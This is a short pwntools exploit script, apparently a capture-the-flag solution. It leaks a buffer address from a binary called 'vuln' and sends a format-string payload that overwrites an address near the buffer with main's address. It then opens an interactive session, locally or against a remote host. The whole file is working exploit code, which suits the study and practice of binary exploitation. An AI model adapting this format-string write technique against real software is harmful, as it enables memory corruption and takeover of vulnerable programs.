#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.terminal = ['tmux','splitw']

def conn():
	if args.REMOTE:
		r = remote("addr",1337)
	else:
		r = process([exe.path])
		if args.GDB:
			gdb.attach(r,gdbscript='''
			c
			''')
	return r


def main():
	r = conn()

	r.recvuntil(b'gift is ')
	bufLocation = int(r.recvline(),16)
	log.info(f"Buffer Location: {hex(bufLocation)}")

	offset = 10 # The offset in the stack that our input exists at
	
	writes = {bufLocation+1048: exe.symbols['main']}
	nWritten = 0 # Bytes written before our fstr is printed (will affect %n)

	payload = fmtstr_payload(offset, writes, numbwritten=nWritten)
	payload = b'%p.%p.%p.%p.%p.' + payload
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()
